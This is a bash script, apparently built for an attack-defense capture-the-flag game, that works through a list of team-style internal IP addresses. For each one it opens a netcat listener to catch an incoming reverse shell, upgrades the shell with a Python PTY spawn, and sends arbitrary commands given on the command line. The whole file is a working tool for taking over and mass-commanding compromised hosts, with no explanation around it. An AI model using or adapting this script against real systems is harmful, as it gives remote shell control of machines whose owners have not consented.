#!/bin/bash
trap 'echo "Interrupted"; exit 1' INT

BASE_PORT=1000
TIMEOUT=6
HOST="192.168.13.104"
TARGETS=(
"10.1.1.10" "10.2.1.10" "10.3.1.10" "10.4.1.10" "10.5.1.10" "10.6.1.10" "10.7.1.10" "10.8.1.10" "10.9.1.10" "10.10.1.10" "10.11.1.10" "10.12.1.10" "10.13.1.10" 
"10.1.1.20" "10.2.1.20" "10.3.1.20" "10.4.1.20" "10.5.1.20" "10.6.1.20" "10.7.1.20" "10.8.1.20" "10.9.1.20" "10.10.1.20" "10.11.1.20" "10.12.1.20" "10.13.1.20" 
"10.1.1.30" "10.2.1.30" "10.3.1.30" "10.4.1.30" "10.5.1.30" "10.6.1.30" "10.7.1.30" "10.8.1.30" "10.9.1.30" "10.10.1.30" "10.11.1.30" "10.12.1.30" "10.13.1.30" 
"10.1.1.40" "10.2.1.40" "10.3.1.40" "10.4.1.40" "10.5.1.40" "10.6.1.40" "10.7.1.40" "10.8.1.40" "10.9.1.40" "10.10.1.40" "10.11.1.40" "10.12.1.40" "10.13.1.40"
)

if [ "$#" -eq 0 ]; then
    echo "Usage: $0 \"cmd1\" \"cmd2\" ..."
    exit 1
fi

for TARGET in "${TARGETS[@]}"; do
    echo "---- Checking $TARGET ----"
    SECOND=$(echo "$TARGET" | cut -d'.' -f2)
    FOURTH=$(echo "$TARGET" | cut -d'.' -f4)
    PORT=$(($BASE_PORT + $SECOND*100 + $FOURTH))
    echo "[$TARGET] Connecting over port $PORT"

expect << EOF
set timeout $TIMEOUT
spawn nc -lvnp $PORT
expect {
    -re "\[#\$\] " { set timeout -1 }
    timeout { puts "[$TARGET] No connection"; exit 0 }
}
send "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\r"
$(for cmd in "$@"; do
    echo "expect -re \"\[#\$\] \""
    echo "send \"$cmd\r\""
done)
expect -re "\[#\$\] "
EOF

done